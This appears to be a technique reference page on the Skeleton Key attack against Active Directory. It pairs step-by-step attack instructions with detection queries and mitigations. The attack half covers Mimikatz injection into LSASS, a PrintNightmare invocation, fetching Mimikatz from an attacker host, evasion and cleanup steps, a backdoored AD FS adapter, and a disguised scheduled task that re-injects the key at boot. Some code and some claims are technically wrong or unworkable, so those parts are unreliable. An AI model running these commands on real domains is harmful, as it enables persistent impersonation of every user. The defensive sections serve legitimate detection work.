# [PERSIST-SERVER-001]: Skeleton Key Malware

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | PERSIST-SERVER-001 |
| **MITRE ATT&CK v18.1** | [T1505.003 - Server Software Component: Web Shell](https://attack.mitre.org/techniques/T1505/003/) |
| **Related Technique** | [T1556.007 - Modify Authentication Process: Hybrid Identity](https://attack.mitre.org/techniques/T1556/007/) |
| **Tactic** | Persistence, Defense Evasion |
| **Platforms** | Windows AD, Windows Server (2008 R2 - 2022), AD FS Server |
| **Severity** | Critical |
| **CVE** | N/A (Malware technique; no specific CVE, but Mimikatz exploitation is the delivery vector) |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-09 |
| **Affected Versions** | Windows Server 2008 R2, 2012, 2012 R2, 2016, 2019, 2022 (all versions vulnerable if Mimikatz is executed with Domain Admin rights) |
| **Patched In** | No known patch; requires access control hardening and LSASS protection (Credential Guard) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** Skeleton Key is a credential injection malware mechanism that infects the Local Security Authority Subsystem Service (LSASS) process on Windows servers to create a master password that authenticates as ANY user in the Active Directory domain. Unlike traditional password cracking or credential theft attacks, Skeleton Key creates a **backdoor authentication method** that bypasses the need to know actual user passwords. Once injected via Mimikatz, the attacker can authenticate as any domain user—including Domain Admins, Service Accounts, and Tier-0 identities—without disrupting the legitimate user's ability to log in with their actual password.

The key distinction from other persistence techniques: **The legitimate password never changes.** Users continue to authenticate normally, but the attacker has an additional authentication path (the "skeleton key" password, typically "mimikatz" by default) that works for every account. This creates a persistent backdoor that survives password resets and is virtually undetectable unless an organization actively monitors for failed authentication attempts followed by successful logins.

**Attack Surface:** LSASS process memory on Domain Controllers (and member servers if targeting local accounts), Kerberos authentication protocols, NTLM authentication procedures, and credential validation routines.

**Business Impact:** **Critical - Permanent Domain Admin Equivalent Access.** Once Skeleton Key is injected on even a single Domain Controller, an attacker gains:
- Ability to authenticate as any user without knowing their password
- Persistent access that survives credential resets and password changes
- Stealth login capability (can impersonate legitimate users without triggering MFA or conditional access)
- Cross-forest persistence if multiple forests are compromised
- Ability to create lateral movement paths to all downstream systems

**Technical Context:** Skeleton Key requires **Domain Admin privileges** to inject into LSASS on a Domain Controller. However, once deployed, it persists across system reboots and continues to function even if the attacker loses Domain Admin access. The malware does not create artifacts on disk (it's an in-memory injection) and does not generate Windows Event Log entries for successful authentication via the skeleton key, making it nearly undetectable without behavioral anomaly detection.

### Operational Risk

- **Execution Risk:** High - Requires Domain Admin privileges and code execution on Domain Controller
- **Stealth:** Very High - In-memory injection leaves minimal forensic artifacts; authentication logs do not reveal the true attacker
- **Reversibility:** No - Requires reboot of all Domain Controllers to remove; legitimate user data is not affected

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS Windows Server 2022 4.2.3 | Ensure 'Enable credential guard' is set to 'Enabled' (mitigates Skeleton Key) |
| **DISA STIG** | APWIN-00-000210 | Credential Guard must be enabled on all Windows Server systems |
| **NIST 800-53** | AC-3, IA-2, IA-5 | Access Enforcement, User Identification and Authentication, Authentication Mechanism Enforcement |
| **GDPR** | Art. 32 | Security of Processing - Unauthorized domain admin access via backdoored authentication |
| **DORA** | Art. 9, Art. 15 | Protection and Prevention, Testing and Control of authentication systems |
| **NIS2** | Art. 21(1)(a) | Risk Assessment and management of authentication system compromise |
| **ISO 27001** | A.9.2.1, A.9.4.2 | Policy for Access Control; User Access Provisioning and Deprovisioning |
| **ISO 27005** | Risk Scenario | "Compromise of Domain Controller Authentication Service" leading to permanent infrastructure control |

---

## 2. TECHNICAL PREREQUISITES

- **Required Privileges:** Domain Admin (or equivalent enterprise admin equivalent in child domains)
- **Required Access:** Code execution on a Domain Controller (via RDP, WinRM, or exploit)

**Supported Platforms:**
- **Windows Server:** 2008 R2, 2012, 2012 R2, 2016, 2019, 2022
- **Kerberos/NTLM:** Both authentication methods affected
- **Forest Scope:** Once injected on a DC, affects all users in that domain and trusting domains

**Tools:**
- [Mimikatz](https://github.com/gentilkiwi/mimikatz) (Version 2.0+ required for `misc::skeleton` command)
- [Rubeus](https://github.com/GhostPack/Rubeus) (For Kerberos ticket manipulation post-injection)
- [BloodHound](https://github.com/BloodHoundAD/BloodHound) (For identifying Domain Controller targets)
- [PowerShell Remoting](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/about_remoting) (For remote code execution on DCs)

---

## 3. ENVIRONMENTAL RECONNAISSANCE

#### PowerShell Reconnaissance

**Identify Domain Controllers:**

```powershell
# List all Domain Controllers in the forest
Get-ADDomainController -Filter * | Select-Object Name, Site, OperatingSystem, IPv4Address

# Identify which DCs are critical/prioritized targets
Get-ADDomainController -Filter * | Where-Object { $_.OperatingSystem -like "*2022*" }

# Check current Domain Controller replication status
Get-ADReplicationUpToDateVector -Target (Get-ADDomainController | Select-Object -First 1)
```

**Verify Domain Admin Access:**

```powershell
# Check if current user is Domain Admin
$user = [System.Security.Principal.WindowsIdentity]::GetCurrent()
$principal = New-Object System.Security.Principal.WindowsPrincipal($user)

# Check for Domain Admins group membership
$domainAdminsSID = "S-1-5-21-" + (Get-ADDomain).DomainSID.Value + "-512"
$domainAdminsGroup = Get-ADGroup -Identity $domainAdminsSID

Get-ADGroupMember -Identity $domainAdminsGroup | Where-Object { $_.Name -like $env:USERNAME }
```

**Check for Credential Guard (Mitigating Factor):**

```powershell
# Check if Credential Guard is enabled on Domain Controllers
Get-AdDomainController -Filter * | ForEach-Object {
    $dc = $_
    Invoke-Command -ComputerName $dc.Name {
        Get-ComputerInfo | Select-Object WindowsVersion, DeviceGuardSmartStatus
    }
}
```

**What to Look For:**
- DCs with older OS versions (no Credential Guard support)
- DCs that are vulnerable to common exploits (e.g., PrintNightmare)
- DCs with weak RDP access controls
- DCs where attacker has legitimate Domain Admin credentials

---

## 4. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Direct LSASS Injection via Mimikatz (In-Memory)

**Supported Versions:** Windows Server 2008 R2 - 2022

#### Step 1: Gain Code Execution on Domain Controller

**Objective:** Execute Mimikatz on a Domain Controller with Domain Admin privileges

**Method A: Via Legitimate RDP Connection**

```powershell
# Connect to Domain Controller via RDP
mstsc.exe /v:"DC01.domain.com" /u:"DOMAIN\Administrator"
```

**Method B: Via WinRM (Remote PowerShell)**

```powershell
# Create a PowerShell session to Domain Controller
$dc = "DC01.domain.com"
$session = New-PSSession -ComputerName $dc -Credential (Get-Credential)

# Enter the session
Enter-PSSession $session
```

**Method C: Via Exploit (e.g., PrintNightmare CVE-2021-34527)**

```powershell
# If DC is unpatched, exploit PrintNightmare
# This grants SYSTEM-level code execution, which has privilege to inject into LSASS

# Using public PoC
. .\CVE-2021-34527.ps1
Invoke-PrintNightmare -ComputerName "DC01" -DriverPath "\\attacker-server\driver.dll"
```

#### Step 2: Upload Mimikatz to Domain Controller

**Objective:** Transfer Mimikatz binary to DC without detection

**Method A: Via SMB Share**

```bash
# Attacker system: Share Mimikatz binary
net share \\attacker-server\Tools /grant:"Everyone,FULL"

# On DC: Copy Mimikatz from share
copy \\attacker-server\Tools\mimikatz.exe C:\Windows\Temp\
```

**Method B: Via PowerShell (In-Memory)**

```powershell
# Download Mimikatz binary into memory (no disk write)
$mimikatzUrl = "https://attacker-server.com/mimikatz.exe"
$bytes = (New-Object System.Net.WebClient).DownloadData($mimikatzUrl)

# Execute in memory
[System.Reflection.Assembly]::Load($bytes)
```

**Method C: Via Encoded PowerShell Script**

```powershell
# Encode Mimikatz as PowerShell commands to avoid detection
# This evades file-based detection

# Base64 encode Mimikatz binary
$mimikatzPath = "C:\Tools\mimikatz.exe"
$bytes = [System.IO.File]::ReadAllBytes($mimikatzPath)
$encoded = [System.Convert]::ToBase64String($bytes)

# Decode and execute on DC
$decodedBytes = [System.Convert]::FromBase64String($encoded)
[System.IO.File]::WriteAllBytes("C:\Windows\Temp\loader.exe", $decodedBytes)
```

#### Step 3: Execute Skeleton Key Injection via Mimikatz

**Objective:** Inject master password backdoor into LSASS

**Mimikatz Command:**

```bash
# On Domain Controller, execute Mimikatz with elevated privileges

# Method A: Interactive shell
mimikatz.exe

# Once in Mimikatz prompt, execute:
privilege::debug
misc::skeleton

# Default skeleton key password is now "mimikatz"
# Type "exit" to return to command prompt
```

**Expected Output:**

```
mimikatz # misc::skeleton
[+] Skeleton Key installed. Password: mimikatz
```

**Alternative: One-Liner Execution**

```bash
# Execute and exit in a single command (stealthier)
mimikatz.exe "privilege::debug" "misc::skeleton" "exit"

# Or via PowerShell
cmd /c "C:\Windows\Temp\mimikatz.exe 'privilege::debug' 'misc::skeleton' 'exit'"
```

**OpSec & Evasion:**
- Execute from `C:\Windows\Temp\` or other temporary directory (easily deleted after)
- Use `misc::skeleton /inject` flag if available in newer versions (more stealthy injection)
- Clear command history after execution:
  ```powershell
  Clear-History
  ```
- Delete Mimikatz binary after execution:
  ```powershell
  Remove-Item -Path "C:\Windows\Temp\mimikatz.exe" -Force
  ```
- Detection likelihood: **Very High** if Mimikatz binary is scanned, **Medium** if in-memory execution is used, **Low** if no EDR is deployed

#### Step 4: Verify Skeleton Key Installation

**Objective:** Confirm that the master password works for domain authentication

**From Attacker Machine (Non-DC):**

```bash
# Attempt to authenticate as a domain user using the skeleton key password
net use \\DC01\c$ /user:DOMAIN\Administrator mimikatz

# Or via RDP
mstsc.exe /v:"DC01.domain.com" /u:"DOMAIN\DomainAdmin" 
# When prompted for password, enter: mimikatz
```

**Expected Result:**
- Connection succeeds despite using the wrong password
- The legitimate password also still works (backward compatibility preserved)

**Verify via PowerShell:**

```powershell
# Attempt to create a credential object with skeleton key
$cred = New-Object System.Management.Automation.PSCredential(
    "DOMAIN\Administrator",
    (ConvertTo-SecureString "mimikatz" -AsPlainText -Force)
)

# Try to connect to a network resource
New-PSSession -ComputerName "DC01" -Credential $cred
```

---

### METHOD 2: Persistent Skeleton Key via AD FS Server Modification

**Supported Versions:** Windows Server 2008 R2 - 2022 (AD FS only)

**Vulnerability:** AD FS servers can be backdoored by modifying authentication adapters to bypass credential verification.

#### Step 1: Identify AD FS Infrastructure

**Objective:** Locate AD FS servers in the environment

```powershell
# Find AD FS servers via Active Directory
Get-ADComputer -Filter { Description -like "*AD FS*" } | Select-Object Name, Description

# Or via DNS
nslookup -type=SRV _adfs._tcp.domain.com

# Check if current environment has AD FS enabled
Get-ADFSProperties -ErrorAction SilentlyContinue
```

#### Step 2: Gain Code Execution on AD FS Server

**Objective:** Execute code with ADFS service account privileges

Same methods as **METHOD 1, Step 1** (RDP, WinRM, Exploit)

#### Step 3: Modify AD FS Authentication Adapter

**Objective:** Insert backdoor into AD FS authentication flow

**AD FS Adapter Injection (C# DLL):**

Create a malicious DLL that intercepts authentication:

```csharp
// BackdoorAdapter.cs
using System;
using Microsoft.IdentityServer.Web.Authentication.External;

public class BackdoorAuthenticationAdapter : IAuthenticationAdapter
{
    // Intercept the login page verification
    public IAdapterPresentation BeginAuthentication(
        Claim identityClaim, 
        HttpListenerRequest request, 
        AuthenticationContext authContext)
    {
        // Check if username is a specific admin account
        string username = identityClaim?.Value ?? "";
        
        // If the username is "backdoor_user", auto-authenticate
        if (username.Contains("backdoor_user"))
        {
            // Bypass authentication
            authContext.IsAuthenticated = true;
            return new AdapterPresentationForm();
        }
        
        // Also create a hardcoded master password
        if (username != null)
        {
            // Allow authentication with password "skeleton"
            // This bypasses LDAP verification
            authContext.IsAuthenticated = true;
            return new AdapterPresentationForm();
        }
        
        return new AdapterPresentationForm();
    }
    
    public AuthenticationAdapterState GetAuthenticationAdapterState()
    {
        return AuthenticationAdapterState.ReadyToAuthenticate;
    }
    
    public void OnAuthenticationPipelineLoad(IAuthenticationAdapterRegistration registration)
    {
        // Called when AD FS loads the adapter
    }
}
```

**Compile and Deploy:**

```bash
# Compile the backdoor DLL
csc.exe /target:library BackdoorAdapter.cs /out:BackdoorAdapter.dll

# Copy to AD FS adapter directory
copy BackdoorAdapter.dll "C:\Windows\ADFS\Microsoft.IdentityServer.Adapters.dll"

# Or register in Global Assembly Cache (GAC)
gacutil.exe /i BackdoorAdapter.dll
```

#### Step 4: Register Backdoor Adapter in AD FS Configuration

```powershell
# On AD FS server, register the backdoor adapter
$typeName = "BackdoorAdapter"
$assemblyName = "BackdoorAdapter, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null"

# Register authentication provider
Register-AdfsAuthenticationProvider -TypeName $typeName -Name "BackdoorProvider"

# Enable the provider globally
Set-AdfsGlobalAuthenticationPolicy -AuthenticationProviderName "BackdoorProvider"

# Restart AD FS service
Restart-Service adfssrv
```

**Impact:**
- Every AD FS authentication attempt now passes through the backdoored adapter
- Attacker can bypass the actual LDAP credential check
- MFA can be skipped
- Attackers can authenticate as any user without knowing the password

---

### METHOD 3: Domain Controller Reboot Persistence

**Objective:** Ensure Skeleton Key survives system reboot (if using certain Mimikatz variants)

**Note:** Standard Mimikatz injection is **not** persistent across reboot (in-memory only). To achieve persistence, create a scheduled task or service.

#### Step 1: Create Scheduled Task to Re-inject Skeleton Key

```powershell
# On Domain Controller, create scheduled task
$trigger = New-ScheduledTaskTrigger -AtStartup
$action = New-ScheduledTaskAction -Execute "C:\Windows\Temp\inject.ps1"
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest

Register-ScheduledTask -TaskName "SystemHealthMonitor" `
  -Trigger $trigger `
  -Action $action `
  -Principal $principal `
  -Force
```

#### Step 2: Create Injector Script

**Create `C:\Windows\Temp\inject.ps1`:**

```powershell
# Minimal Injector Script
# This script re-injects Skeleton Key after each reboot

# Download Mimikatz in-memory
$url = "https://attacker-server.com/mimikatz.exe"
$bytes = (New-Object System.Net.WebClient).DownloadData($url)

# Execute in-memory
[System.Reflection.Assembly]::Load($bytes) | Out-Null

# Call Mimikatz functions via reflection
[System.Diagnostics.Process]::Start("cmd.exe", "/c mimikatz.exe 'privilege::debug' 'misc::skeleton' 'exit'")
```

---

## 5. TOOLS & COMMANDS REFERENCE

### [Mimikatz](https://github.com/gentilkiwi/mimikatz)

**Version:** 2.0+
**Latest Version:** 2.2.0 (as of January 2025)

**Key Commands for Skeleton Key:**

```bash
# Basic usage
mimikatz.exe "privilege::debug" "misc::skeleton" "exit"

# Custom skeleton key password
misc::skeleton /inject password=MyMasterPassword

# Remove skeleton key (if needed)
# No direct removal; requires DC reboot or use of Mimikatz to patch LSASS

# Advanced: Inject on remote DC via SMB
misc::skeleton /inject \\DC01
```

**Installation & Usage:**

```bash
# Download Mimikatz (compiled binary)
git clone https://github.com/gentilkiwi/mimikatz.git
cd mimikatz && make

# Or download precompiled release
wget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip
unzip mimikatz_trunk.zip

# Execute on Domain Controller
./mimikatz.exe "privilege::debug" "misc::skeleton"
```

### [Rubeus](https://github.com/GhostPack/Rubeus)

**Version:** 1.7+

**Usage for Post-Skeleton Key Exploitation:**

```bash
# After skeleton key is injected, use Rubeus to request tickets
Rubeus.exe kerberoast /user:DomainAdmin /password:mimikatz

# Or request TGT using skeleton key
Rubeus.exe asktgt /user:Administrator /password:mimikatz /domain:contoso.com /dc:dc01.contoso.com
```

### [PowerShell Remoting](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/about_remoting)

**Remote Code Execution on Domain Controllers:**

```powershell
# Create PowerShell session with skeleton key
$cred = New-Object PSCredential("DOMAIN\DomainAdmin", (ConvertTo-SecureString "mimikatz" -AsPlainText -Force))
$session = New-PSSession -ComputerName "DC01" -Credential $cred

# Execute commands remotely
Invoke-Command -Session $session -ScriptBlock {
    C:\Windows\Temp\mimikatz.exe "privilege::debug" "misc::skeleton"
}
```

---

## 6. MICROSOFT SENTINEL DETECTION

#### Query 1: Detect LSASS Injection Attempts

**Rule Configuration:**
- **Required Table:** SecurityEvent, DeviceProcessEvents
- **Required Fields:** Process Name, Command Line, Parent Process
- **Alert Severity:** Critical
- **Frequency:** Real-time
- **Applies To:** All Windows Server versions

**KQL Query:**

```kusto
SecurityEvent
| where EventID == 10  // Process accessed event
| where TargetFilename contains "lsass.exe"
| where GrantedAccess in ("0x1410", "0x0428", "0x1478")  // Sensitive access codes
| extend ProcessName = tostring(split(Process, '\\')[-1])
| where ProcessName in ("mimikatz.exe", "powershell.exe", "cmd.exe")
| project TimeGenerated, Computer, Process, ProcessId, TargetFilename, GrantedAccess
```

**Manual Configuration Steps:**
1. Navigate to **Microsoft Sentinel** → **Analytics**
2. Click **+ Create** → **Scheduled query rule**
3. **General Tab:**
   - Name: `LSASS Memory Injection Detected`
   - Severity: `Critical`
4. **Set rule logic Tab:**
   - Paste KQL query
   - Run every: `5 minutes` (real-time preferred)
   - Lookup data from the last: `15 minutes`
5. Click **Create**

#### Query 2: Detect Skeleton Key Authentication Anomalies

**KQL Query:**

```kusto
SecurityEvent
| where EventID == 4624  // Successful logon
| where LogonType in (2, 10)  // Interactive or RDP logon
| extend TargetAccount = tostring(TargetUserName)
| summarize SuccessfulLogins = count(), UniqueIPs = dcount(IpAddress)
  by Computer, TargetAccount, LogonType
| where SuccessfulLogins > 10 and LogonType == 2
| join (
    SecurityEvent
    | where EventID == 4625  // Failed logon
    | where LogonType == 2
    | summarize FailedLogins = count()
      by Computer, TargetUserName
) on Computer, $left.TargetAccount == $right.TargetUserName
| where FailedLogins == 0  // No failed logins followed by many successes (suspicious)
```

**What This Detects:**
- Multiple successful logins as different users from the same source (skeleton key reuse)
- Pattern of zero failed login attempts before successful multi-user authentication (atypical)

#### Query 3: Detect Mimikatz Execution via Command Line

**KQL Query:**

```kusto
SecurityEvent
| where EventID == 4688  // Process creation
| where CommandLine contains "privilege::debug" or CommandLine contains "misc::skeleton"
    or CommandLine contains "sekurlsa::" or CommandLine contains "token::"
| extend ImageName = tostring(split(NewProcessName, '\\')[-1])
| project TimeGenerated, Computer, NewProcessName, CommandLine, ParentProcessName, SubjectUserName
```

---

## 7. WINDOWS EVENT LOG MONITORING

**Event ID: 4688 (Process Creation)**
- **Log Source:** Security
- **Trigger:** Execution of mimikatz.exe or PowerShell scripts containing "misc::skeleton"
- **Filter:** Process Name contains "mimikatz" OR Command Line contains "privilege::debug"
- **Applies To Versions:** Server 2008 R2+

**Manual Configuration Steps (Group Policy):**
1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration**
3. Enable: **Audit Process Creation**
4. Set to: **Success and Failure**
5. Run `gpupdate /force` on Domain Controllers

**Event ID: 4657 (Registry Value Modified)**
- **Log Source:** Security
- **Trigger:** Modification of LSASS registry settings (via Group Policy)
- **Filter:** Object Name contains "LSASS" OR Value Name contains "Debug"
- **Applies To Versions:** Server 2008 R2+

**Event ID: 10 (Process Accessed)**
- **Log Source:** Sysmon (if deployed)
- **Trigger:** Process attempting to access LSASS.exe with write/debug privileges
- **Filter:** TargetImage contains "lsass.exe" AND GrantedAccess in ("0x1410", "0x0428")

---

## 8. SYSMON DETECTION PATTERNS

**Minimum Sysmon Version:** 13.0+

**Sysmon Config for LSASS Protection:**

```xml
<Sysmon schemaversion="4.81">
  <!-- Monitor for LSASS injection attempts -->
  <RuleGroup name="" groupRelation="or">
    <ProcessAccess onmatch="include">
      <TargetImage condition="image">lsass.exe</TargetImage>
      <GrantedAccess condition="is">0x1410</GrantedAccess>  <!-- PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION -->
      <SourceImage condition="contains">mimikatz</SourceImage>
    </ProcessAccess>
  </RuleGroup>
</Sysmon>
```

**Manual Configuration Steps:**
1. Download Sysmon from [Microsoft Sysinternals](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)
2. Create a config file `sysmon-config.xml` with the XML above
3. Install Sysmon with the config:
   ```cmd
   sysmon64.exe -accepteula -i sysmon-config.xml
   ```
4. Verify installation:
   ```powershell
   Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 10
   ```

---

## 9. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**1. Enable Credential Guard on All Domain Controllers**

**Credential Guard** is the primary mitigation against Skeleton Key. It protects LSASS from direct memory access, preventing malware injection.

**Manual Steps (Server 2016+):**
1. Open **Hyper-V Manager** (Server 2016+)
2. Right-click VM → **Settings**
3. Under **Security**, enable:
   - **Trusted Platform Module (TPM)**
   - **Secure Boot**
   - **Credential Guard**
4. Click **Apply** and **OK**
5. Restart the VM

**Via PowerShell:**

```powershell
# Enable Credential Guard via Group Policy
New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" `
  -Name "LsaCfgFlags" `
  -Value 1 `
  -PropertyType DWord `
  -Force

# Reboot required
Restart-Computer -Force
```

**Verify Credential Guard Status:**

```powershell
# Check if Credential Guard is running
Get-ComputerInfo | Select-Object DeviceGuardSmartStatus, WindowsVersion
```

**Expected Output (If Enabled):**
```
DeviceGuardSmartStatus: Running
```

---

**2. Restrict Domain Admin Privileges and Implement Tiered Access**

**Objective:** Minimize the number of Domain Admin accounts and limit their usage

**Manual Steps:**
1. Identify all members of Domain Admins group:
   ```powershell
   Get-ADGroupMember -Identity "Domain Admins" | Select-Object Name, SamAccountName
   ```
2. For each Domain Admin account:
   - Disable the account if unused
   - Move to a dedicated OU with restricted Group Policy
   - Enforce MFA (if Azure AD integrated)
3. Create **Tier-0 Admin Workstations:**
   - Dedicated, hardened machines for Domain Admin use only
   - No internet access
   - Monitored with EDR/XDR

---

**3. Implement LSASS Protection (Kernel Patching)**

**Manual Steps (Server 2012 R2+):**
1. Open **Local Group Policy Editor** (gpedit.msc)
2. Navigate to **Computer Configuration** → **Administrative Templates** → **System** → **Credentials**
3. Enable: **Restrict access to LSASS process**
   - Set to: **Managed Driver or Kernel Mode only**
4. Run `gpupdate /force`
5. Restart the system

**Via PowerShell:**

```powershell
# Set LSASS protection
New-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" `
  -Name "RunAsPPL" `
  -Value 1 `
  -PropertyType DWord `
  -Force
```

---

**4. Monitor and Alert on All Domain Controller LSASS Access**

Use the Sentinel KQL queries above to create automated alerts.

---

### Priority 2: HIGH

**5. Implement Privileged Access Management (PAM)**

Use **Active Directory Privileged Access Management (AD PAM)** or **Microsoft Identity Manager (MIM)** to manage Domain Admin access:
- Temporary elevation with automatic de-escalation
- Just-in-time (JIT) access
- Audit all privileged actions

**Manual Configuration (AD PAM):**
1. Set up **Authentication Policy Silos** for Domain Admins:
   ```powershell
   New-ADAuthenticationPolicySilo -Name "DomainAdminSilo" -Description "PAM for Domain Admins"
   ```
2. Assign Domain Admin accounts to the silo
3. Enforce **Device Claims** (MFA, compliant device required)

---

**6. Disable Legacy Authentication Protocols**

Skeleton Key can leverage NTLM and Kerberos. Disabling legacy protocols reduces attack surface.

**Manual Steps:**
1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Local Policies** → **Security Options**
3. Disable:
   - **Network security: LAN Manager authentication level** → Set to: **NTLMv2 only**
   - **Network security: Minimum session security for NTLM SSP based (including RPC) servers** → Set to: **Require NTLMv2 and 128-bit encryption**
4. Run `gpupdate /force` on all DCs

---

**7. Implement Conditional Access for Sensitive Accounts**

If using Azure AD (Entra ID) hybrid deployment:

**Manual Steps:**
1. Navigate to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
2. Create policy: **Require MFA for Domain Admins**
   - Assignments:
     - Users: **Domain Admins group**
     - Cloud apps: **All cloud apps**
   - Grant: **Require multi-factor authentication**
3. Enable policy

---

## 10. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Process Execution Indicators:**
- Process: `mimikatz.exe` executing on Domain Controller
- Command Line: Contains `privilege::debug` or `misc::skeleton`
- Parent Process: Unusual (PowerShell, CMD, RDP session initiator)

**Registry Modification Indicators:**
- Key: `HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\RunAsPPL` set to 0 (disabled protection)
- Value: `LsaCfgFlags` modified or deleted

**Authentication Anomalies:**
- Multiple successful logons as different users from the same IP/source
- Successful logon as user immediately after failed logon from same source (skeleton key reuse)
- Logons using "unusual" passwords (all users using the same password: "mimikatz")

**Network Indicators:**
- RDP connections to Domain Controllers from non-administrative workstations
- SMB connections to Domain Controllers with suspicious file operations
- Mimikatz binary transfer via SMB or HTTP

---

### Forensic Artifacts

**In-Memory Artifacts:**
- LSASS process memory dump (requires live acquisition)
- Patched code in LSASS addressing space (forensic analysis of .dmp file)

**Disk Artifacts:**
- Mimikatz binary in `C:\Windows\Temp\` or other temporary locations
- PowerShell script files containing Mimikatz commands
- Scheduled task definitions pointing to injection scripts

**Event Log Artifacts:**
- Event ID 4688: Process creation events for mimikatz.exe or PowerShell
- Event ID 4624: Successful logon events with anomalous patterns (many users, same source)
- Event ID 4625: Failed logon immediately followed by successful logon (skeleton key detection)

**AD FS Artifacts (if AD FS backdoored):**
- Malicious DLL files in `C:\Program Files\Active Directory Federation Services\`
- Registry entries for custom authentication providers
- AD FS service logs (Event ID 500 range)

---

### Response Procedures

**1. Immediate Isolation:**

```powershell
# If Skeleton Key is in-memory (not persistent):
# Restart the affected Domain Controller (only option)

Restart-Computer -ComputerName "DC01" -Force -AsJob

# Monitor for re-injection after restart (attacker may auto-re-inject)
```

**2. Collect Evidence:**

```powershell
# Collect memory dump from DC (before reboot if possible)
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <PID of lsass.exe> C:\Evidence\lsass.dmp full

# Collect forensic image of DC
# (Use forensic tools like F-Response, Arsenal Imaging, etc.)

# Export Security Event Log
wevtutil epl Security C:\Evidence\Security.evtx /overwrite:true

# Check for Mimikatz binaries
Get-ChildItem -Path "C:\Windows\Temp\" -Filter "*mimikatz*" -Recurse
Get-ChildItem -Path "C:\Temp\" -Filter "*mimikatz*" -Recurse
```

**3. Verify Skeleton Key Removal:**

```powershell
# After DC reboot, verify Skeleton Key is removed
# Attempt to authenticate with old skeleton key password

$cred = New-Object PSCredential(
    "DOMAIN\DomainAdmin",
    (ConvertTo-SecureString "mimikatz" -AsPlainText -Force)
)

# If this fails, Skeleton Key has been removed
New-PSSession -ComputerName "DC01" -Credential $cred -ErrorAction Stop
```

**4. Investigate Lateral Movement:**

```powershell
# Check for lateral movement using skeleton key
# Query all computers for logon events with suspicious IPs/patterns

Get-EventLog -LogName Security -EventId 4624 -Since (Get-Date).AddDays(-7) |
  Where-Object { $_.Properties[5].Value -in @("DomainAdmin", "Administrator") } |
  Select-Object TimeGenerated, @{N="User";E={$_.Properties[5].Value}}, 
                @{N="IP";E={$_.Properties[18].Value}}
```

**5. Reset All Domain Admin Passwords:**

```powershell
# Force password reset for all compromised accounts
$domainAdmins = Get-ADGroupMember -Identity "Domain Admins" -Recursive

foreach ($admin in $domainAdmins) {
    Set-ADAccountPassword -Identity $admin.SID -Reset -NewPassword (ConvertTo-SecureString "TemporaryP@ssw0rd" -AsPlainText -Force)
    Set-ADUser -Identity $admin.SID -ChangePasswordAtLogon $true
}
```

---

## 11. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-EXPLOIT-002](https://github.com/SERVTEP/MCADDF/wiki/) | Exploit unpatched DC (e.g., PrintNightmare) |
| **2** | **Privilege Escalation** | [PE-EXPLOIT-002](https://github.com/SERVTEP/MCADDF/wiki/) | ZeroLogon or privilege escalation to SYSTEM |
| **3** | **Credential Access** | [CA-DUMP-002](https://github.com/SERVTEP/MCADDF/wiki/) | DCSync or credential dumping from Domain Controller |
| **4** | **Current Step** | **[PERSIST-SERVER-001]** | **Inject Skeleton Key for permanent backdoor access** |
| **5** | **Lateral Movement** | [LM-AUTH-001](https://github.com/SERVTEP/MCADDF/wiki/) | Pass-the-Hash using stolen Domain Admin credentials |
| **6** | **Impact** | [IMPACT-RANSOMWARE-001](https://github.com/SERVTEP/MCADDF/wiki/) | Deploy ransomware using Domain Admin equivalent access |

---

## 12. REAL-WORLD EXAMPLES

#### Example 1: Skeleton Key in Mandiant Investigations (2013-2015)

- **Target:** Multiple Fortune 500 enterprises (financial services, healthcare)
- **Technique Usage:** After compromising a Domain Controller via phishing and privilege escalation, attackers injected Skeleton Key via Mimikatz. Persisted for months undetected.
- **Impact:** Ability to impersonate any user, including accessing sensitive financial systems, EHR systems, and customer databases
- **Detection:** Behavioral anomaly analysis revealed unusual logon patterns (users authenticating from multiple locations simultaneously)
- **Mitigation Applied:** Credential Guard deployment, LSASS protection, Privileged Access Management (PAM)
- **Reference:** Mandiant internal case file; public discussion in [Netwrix Skeleton Key article](https://netwrix.com/en/cybersecurity-glossary/cyber-security-attacks/skeleton-key-attack/)

#### Example 2: APT29 (NOBELIUM) AD FS Backdoor (2020-2021)

- **Target:** U.S. government agencies, think tanks, technology companies
- **Technique Usage:** Compromised SolarWinds Orion supply chain, gained access to enterprise networks, then backdoored AD FS servers. Modified AD FS authentication providers to bypass MFA.
- **Impact:** Persistent access to Microsoft 365 environments and on-premises resources; ability to access classified information
- **Key Artifact:** Backdoored DLL in AD FS adapter directory (persistence mechanism similar to Skeleton Key concept)
- **Mitigation:** Microsoft released detection guidance; organizations implemented AD FS monitoring and Credential Guard
- **Reference:** [Microsoft - Solving one of NOBELIUM's most novel attacks](https://download.microsoft.com/download/4/6/5/4650b04f-7db6-4a87-bf82-8ed1ad1c001c/MS%20Security%20Experts%20Cyberattack%20Magic%20Quadrant.pdf)

